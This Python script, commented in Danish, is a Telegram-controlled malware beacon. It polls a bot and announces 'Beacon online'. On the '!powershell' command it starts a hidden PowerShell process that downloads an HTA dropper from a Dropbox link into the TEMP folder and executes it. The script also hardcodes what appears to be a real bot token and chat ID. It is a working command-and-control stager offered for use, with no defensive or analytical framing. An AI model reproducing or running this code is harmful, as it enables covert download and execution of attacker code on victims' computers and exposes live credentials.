import requests
import subprocess
import time

# === BOT KONFIGURATION ===
BOT_TOKEN = "8491181941:AAFxvCWFoZrAEzFLzTegxhRPryltB4J0sk0"
CHAT_ID = "3032183658"

# === FUNKTION: HENT OPDATERINGER ===
def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 30, "offset": offset}
    response = requests.get(url, params=params)
    return response.json()

# === FUNKTION: SEND BESKED ===
def send_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": text})

# === FUNKTION: EKSEKVER POWERSHELL-STAGER ===
def execute_powershell_stager():
    ps = r'''powershell -w hidden -c "iwr -useb 'https://www.dropbox.com/scl/fi/ub7640zuo1f5cavzwlrdq/launch_dropper.hta?rlkey=suk5742r8koucrc35i4jz95z5&raw=1' | Out-File $env:TEMP\d.hta; Start-Process $env:TEMP\d.hta"'''
    subprocess.Popen(ps, shell=True)

# === MAIN LOOP ===
def main():
    offset = None
    send_message("📡 Beacon online og klar...")

    while True:
        updates = get_updates(offset)
        if "result" in updates:
            for update in updates["result"]:
                offset = update["update_id"] + 1
                message = update.get("message", {}).get("text", "").strip()

                if message.lower() == "!powershell":
                    send_message("🚀 Udfører PowerShell Stage 2...")
                    execute_powershell_stager()

        time.sleep(3)

if __name__ == "__main__":
    main()
